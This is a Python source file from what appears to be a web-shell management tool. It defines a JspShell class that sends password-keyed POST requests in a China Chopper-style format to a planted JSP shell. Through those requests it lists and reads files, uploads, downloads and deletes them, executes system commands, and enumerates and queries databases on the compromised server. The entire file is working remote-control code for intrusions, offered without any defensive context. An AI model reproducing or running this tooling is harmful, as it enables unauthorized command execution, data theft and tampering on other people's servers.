# coding=utf-8

"""
@version: 1.0
@author: chaowei
@file: shell.py
@time: 2018/2/18 16:52
"""
import requests

import sys

sys.path.append("..")

import config
from entity import *
from dbHelper import DatabaseHelper
from logger import log

class ShellTools:

    def __init__(self):
        pass

    @staticmethod
    def getShellTools(shellEntity):
        if shellEntity.shell_script_type=='JSP':
            return JspShell(shellEntity)

class JspShell:

    def __init__(self,shellEntity):
        self.shellEntity=shellEntity
        self.httpSettingEntity=DatabaseHelper.getHttpSettingEntityByShellID(shellEntity.shell_id)
        if not self.httpSettingEntity:
            self.httpSettingEntity=HttpSettingEntity(config.HTTP_DEFAULT_COOKIE,config.HTTP_DEFAULT_UA)
        self.httpHeaders={'User-Agent': self.httpSettingEntity.user_agent,'Cookie':self.httpSettingEntity.cookie}

    def __sendRequests(self,payload):
        response=None
        try:
            response= requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload, verify=False)
        except Exception as e:
            log.e(str(e))
        return response

    def getStart(self):
        payload = {self.shellEntity.shell_password: 'A', 'z0': self.shellEntity.shell_encode_type}
        return self.__sendRequests(payload)

    def getDirectoryContent(self, path):
        payload = {self.shellEntity.shell_password: 'B', 'z1': path, 'z0': self.shellEntity.shell_encode_type}
        return self.__sendRequests(payload)

    def getFileContent(self,path):
        payload = {self.shellEntity.shell_password: 'C', 'z1': path, 'z0': self.shellEntity.shell_encode_type}
        return self.__sendRequests(payload)

    def createFile(self,path,content):
        payload = {self.shellEntity.shell_password: 'D', 'z1': path, 'z0': self.shellEntity.shell_encode_type,
                   'z2': content}
        return self.__sendRequests(payload)

    def deleteFileOrDirectory(self,path):
        payload = {self.shellEntity.shell_password: 'E', 'z1': path, 'z0': self.shellEntity.shell_encode_type}
        return self.__sendRequests(payload)

    def downloadFile(self,path):
        chunk_size = 1024
        payload = {self.shellEntity.shell_password: 'F', 'z1': path, 'z0': self.shellEntity.shell_encode_type}
        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload,stream=True,verify=False)
        if response.status_code==200:
            for data in response.iter_content(chunk_size=chunk_size):
                yield True,data
        else:
            yield False,response

    def uploadFile(self,path,hexString):
        payload = {self.shellEntity.shell_password: 'G', 'z1': path, 'z0': self.shellEntity.shell_encode_type,
                   'z2': hexString}
        return self.__sendRequests(payload)

    def excuteCommand(self,commandZ1,commandZ2):
        payload = {self.shellEntity.shell_password: 'M', 'z1': commandZ1, 'z2': commandZ2,
                   'z0': self.shellEntity.shell_encode_type}
        return self.__sendRequests(payload)

    def getDatabases(self,connectInfo):
        payload = {self.shellEntity.shell_password: 'N', 'z1': connectInfo.replace('\n', '\r\n'),
                   'z0': self.shellEntity.shell_encode_type, 'z2': ''}
        return self.__sendRequests(payload)

    def getTables(self,connectInfo,databaseName):
        payload = {self.shellEntity.shell_password: 'O',
                   'z1': connectInfo.replace('\n', '\r\n') + '\r\n' + databaseName,
                   'z0': self.shellEntity.shell_encode_type, 'z2': ''}
        return self.__sendRequests(payload)

    def getColumns(self,connectInfo,databaseName,tableName):
        payload = {self.shellEntity.shell_password: 'P',
                   'z1': connectInfo.replace('\n', '\r\n') + '\r\n' + databaseName + '\r\n' + tableName,
                   'z0': self.shellEntity.shell_encode_type, 'z2': ''}
        return self.__sendRequests(payload)

    def excuteSqlQuery(self,connectInfo,databaseName,sqlStr):
        payload = {self.shellEntity.shell_password: 'Q',
                   'z1': connectInfo.replace('\n', '\r\n') + '\r\n' + databaseName, 'z2': sqlStr,
                   'z0': self.shellEntity.shell_encode_type}
        return self.__sendRequests(payload)
